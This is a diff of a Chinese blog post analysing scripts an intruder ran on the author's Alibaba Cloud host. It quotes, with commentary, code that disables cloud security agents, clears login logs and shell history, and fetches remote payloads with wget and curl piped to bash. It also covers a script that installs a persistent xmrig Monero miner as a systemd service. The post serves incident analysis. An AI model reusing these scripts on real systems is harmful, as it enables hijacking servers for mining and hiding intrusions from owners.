@@ -1,82 +1,11 @@
 # 记上次黑客入侵阿里云主机，并分析其代码行为。
 
-已将问题反馈到阿里云安全团队客服，并向阿里云中心举报其地址。接下来是代码分析。(中)
-
-## xz.sh部分，即卸载脚本
-
-参考信息源：
-
-* [bili_62374023667-linux下ETH转发服务器+ETH抽水教程，支持SSL加密+删除阿狸监控避免上报](https://www.bilibili.com/read/cv15054271/)
-* [csdn-linux+agent卸载_华为云服务器卸载agent监控服务Linux+windows教程](https://blog.csdn.net/weixin_33148621/article/details/113900993)
-* [CentOS服务器清除用户登录记录和命令历史方法](https://blog.csdn.net/cljdsc/article/details/123358983)
-* [Linux基础：history命令](https://blog.51cto.com/skypegnu1/1941153)
+已将问题反馈到阿里云安全团队客服，并向阿里云中心举报其地址。接下来是代码分析。(bk.sh)
 
 
-黑客核心代码解读
+## bk.sh，推测是靶机脚本(if 部分)
 
-```
-# 首先是下载阿里云盾卸载脚本
-wget http://update.aegis.aliyun.com/download/uninstall.sh
-chmod +x uninstall.sh && ./uninstall.sh
-# 然后屏蔽掉云盾IP
-iptables -I INPUT -s 140.205.201.0/28 -j DROP
-# 进行恶意卸载云盾等其他组件服务
-sh /usr/local/qcloud/stargate/admin/uninstall.sh
-# 还把监控都给停止了
-service telescoped stop
-# 清除系统登录成功命令历史记录
-echo > /var/log/wtmp 
-# 清除登陆系统失败的记录
-echo > /var/log/btmp
-# 导入空记录，清除历史执行命令
-echo > .bash_history
-# 清除历史执行命令并保存。
-history -c && history -w
-# 删掉脚本
-rm -rf cd /root/uninstall.sh
-```
-
-## k.sh，即杀死进程脚本
-
-参考信息源：
-
-* [Shell 文件或目录操作符（-e、-d、-f、-r、-w、-x）](https://blog.csdn.net/zz00008888/article/details/122360612)
-
-黑客核心代码解读
-
-```
-# 结束dos26（可能为ddos）
-killall -9 dos26
-# 结束不明程序（命名不知其意）
-killall -9 tfq
-# 结束挖矿程序
-killall -9 xmrig
-# 删除程序
-rm -rf cd /tmp/dos26
-rm -rf cd /tmp/tfq
-rm -rf cd /tmp/xmrig
-# 判断对象是否有可写(Write)权限，是则为真
-if [ ! -w "/tmp/dos64" ]; then
-# 进入目录，下载恶意dos，赋予读写及执行权限，并执行
-    cd /tmp;wget https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/dos64;chmod 777 dos64;./dos64
-fi
-if [ ! -w "/root/c3pool/xmrig" ]; then
-# 下载恶意靶机脚本执行
-    curl -s -L https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/ba.sh | bash -s
-fi
-# 又一次删除程序
-rm -rf cd /tmp/dos26
-rm -rf cd /tmp/tfq
-rm -rf cd /tmp/xmrig
-# 休眠，删掉挖矿记录文件
-sleep 88;rm -rf cd /root/c3pool
-```
-
-## bk.sh，推测是靶机脚本
-
-### if语句检测环境内容
-
-#### 第一层 if
+### 第一层 if
 
 参考信息源：
 
@@ -133,7 +62,7 @@ fi
 
 以上这echo所打印的报错信息，基本也说明主机不能正常使用，这对他们黑客而言，已经没有任何价值了。如果这些正常的话，则运行下载好的挖矿脚本，以及其专用的挖矿程序。然后又是层层的if环境检验。
 
-#### 第二层 if
+### 第二层 if
 
 参考信息源：
 
@@ -142,6 +71,7 @@ fi
 * [XMR恶意挖矿案例简析](https://www.sohu.com/a/260504074_354899)
 * [诱捕黑客的蜜罐系统](https://baijiahao.baidu.com/s?id=1706341262655959831)
 * [linux应用之test命令详细解析](https://www.cnblogs.com/tankblog/p/6160808.html)
+* [Shell脚本中$0、$?、$!、$$、$*、$#、$@等的意义以及linux命令执行返回值代表意义](https://blog.csdn.net/helloxiaozhe/article/details/80940066)
 
 
 ```
@@ -177,8 +107,114 @@ if ! tar xf /tmp/xmrig.tar.gz -C $HOME/c3pool --strip=1; then
 fi
 ```
 
+### 推测其意，做环境判断之后，用正则配置json
 
-### echo信息
+参考信息源：
+
+* [百度知道-Linux下面这条命令能逐个解释一下吗:cat /etc/passwd |cut -f 1 -d ](https://zhidao.baidu.com/question/555970944.html)
+* [博客园-Linux命令之cut](https://www.cnblogs.com/zhoujingyu/p/4948051.html)
+* [csdn-linux中的sed参数,sed一些参数的用法](https://blog.csdn.net/weixin_39891317/article/details/116855981)
+* [linux 抽取ip地址,Linux bash脚本提取IP地址](https://blog.csdn.net/weixin_36371924/article/details/116767805)
+* [linux中awk命令详解(最全面秒懂）](https://www.cnblogs.com/zhengyan6/p/16290156.html)
+
+指令逐条解释
+
+* `hostname | cut -f1 -d"."` 将hostname的输出结果，传递给cut，以“.”切割分段行显示
+* `sed -r 's/[^a-zA-Z0-9\-]+/_/g'` 删除所有特殊字符(除了数字以及大小写字母)。
+* `ip route get 1` 返回路由条目，包括IP、网关、uid。
+* `awk '{print $NF;exit}'` 对内容空格分段。
+
+```
+PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+if [ "$PASS" == "localhost" ]; then
+# 测试这条命令输出为0
+  PASS=`ip route get 1 | awk '{print $NF;exit}'`
+fi
+# 推测是配置json账户信息
+if [ -z $PASS ]; then
+  PASS=na
+fi
+if [ ! -z $EMAIL ]; then
+  PASS="$PASS:$EMAIL"
+fi
+```
+
+将json拷贝一份，作为后台文件，再用sed配置成后台运行。
+
+```
+cp $HOME/c3pool/config.json $HOME/c3pool/config_background.json
+sed -i 's/"background": *false,/"background": true,/' $HOME/c3pool/config_background.json
+```
+
+
+### `cat >/tmp/c3pool_miner.service <<EOL` 注入设置脚本后台启动等
+
+#### EOL注入脚本文件
+
+参考信息源：
+
+* [知乎专栏-heredoc入门](https://zhuanlan.zhihu.com/p/93993398)
+* [linux265-pidof命令](https://linux265.com/course/linux-command-pidof.html)
+* [linux265-nice命令](https://linux265.com/course/linux-command-nice.html)
+
+`<<EOL EOL`创建与书写任意格式文本及代码。`pidof xxx`为查看xxx程序的进程号。nice命令调度进程的优先级，根据教程资料来看，黑客的代码语法还有些问题。
+
+```
+cat >$HOME/c3pool/miner.sh <<EOL
+#!/bin/bash
+if ! pidof xmrig >/dev/null; then
+  nice $HOME/c3pool/xmrig \$*
+else
+  echo ""
+fi
+EOL
+```
+
+#### service内容解读
+
+
+
+```
+  if ! type systemctl >/dev/null; then
+
+    echo ""
+	echo ""
+    /bin/bash $HOME/c3pool/miner.sh --config=$HOME/c3pool/config_background.json >/dev/null 2>&1
+    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
+    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
+
+  else
+
+    echo "[*] Creating c3pool_miner systemd service"
+    cat >/tmp/c3pool_miner.service <<EOL
+[Unit]
+Description=Monero miner service
+
+[Service]
+ExecStart=$HOME/c3pool/xmrig --config=$HOME/c3pool/config.json
+Restart=always
+Nice=10
+CPUWeight=1
+
+[Install]
+WantedBy=multi-user.target
+EOL
+    sudo mv /tmp/c3pool_miner.service /etc/systemd/system/c3pool_miner.service
+    echo ""
+	echo ""
+    sudo killall xmrig 2>/dev/null
+    sudo systemctl daemon-reload
+    sudo systemctl enable c3pool_miner.service
+    sudo systemctl start c3pool_miner.service
+    echo "To see miner service logs run \"sudo journalctl -u c3pool_miner -f\" command"
+	echo ""
+  fi
+
+```
+
+
+
+### “echo”及“#”打印及注释信息收集
 
 echo部分为英语，我用翻译及个人有限功底理解其代码。第一行，中二教言语，忽略；从第二行开始翻译解读。
 
